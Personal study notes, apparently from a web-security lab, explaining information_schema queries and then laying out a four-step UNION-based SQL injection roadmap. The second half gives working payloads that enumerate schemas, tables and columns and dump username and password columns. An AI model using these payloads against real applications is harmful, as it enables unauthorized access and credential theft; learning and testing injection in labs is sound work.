

````markdown
# 📂 Listing the Contents of a Database

Most database types (**except Oracle**) use the `information_schema` views to provide metadata about the database structure.  

---

## 📋 List All Tables
Query all tables in the database:  

```sql
SELECT * FROM information_schema.tables;
````

### 🔎 Example Output

```
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE
======================================================
MyDatabase      dbo            Products     BASE TABLE
MyDatabase      dbo            Users        BASE TABLE
MyDatabase      dbo            Feedback     BASE TABLE
```

➡️ This output indicates three tables exist:

- **Products**
    
- **Users**
    
- **Feedback**
    

---

## 📋 List Columns of a Table

Query all columns of a specific table:

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users';
```

### 🔎 Example Output

```
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   COLUMN_NAME   DATA_TYPE
===================================================================
MyDatabase      dbo            Users        UserId        int
MyDatabase      dbo            Users        Username      varchar
MyDatabase      dbo            Users        Password      varchar
```

➡️ This output shows that the **Users** table contains:

- **UserId** → `int`
    
- **Username** → `varchar`
    
- **Password** → `varchar`
    

---

## 📝 Notes

- Works on **MySQL**, **PostgreSQL**, and **Microsoft SQL Server**.
    
- Oracle uses **different system views** (e.g., `all_tables`, `all_tab_columns`).
search name  of database to get column_names table_schema etc




Gifts'UNION SELECT data_type,column_name from information_schema.columns where table_schema = 'public' and table_name= 'users_kmywri'--



# self note this is a manuel road map to dump sensitive info 
step1: find table schema equavalent to -dbs data bases when using sqlmap
Gifts'UNION SELECT '*',table_schema from information_schema.tables--


step2: find tables in table_schema or database
Gifts'UNION SELECT '*',table_name from information_schema.columns where table_schema='public'--

step3: find the columns in the tables 
Gifts'UNION SELECT '*',column_name from information_schema.columns where table_schema='public' and table_name='users_kmywri'--


step4 dump the columns and get the sensitive data 
Gifts'UNION SELECT username_eljsqi,password_qxznct from users_kmywri--


this is alot eaiser after getting the version of sql but i trust you wunt have a hard time figuring it all out ---

```

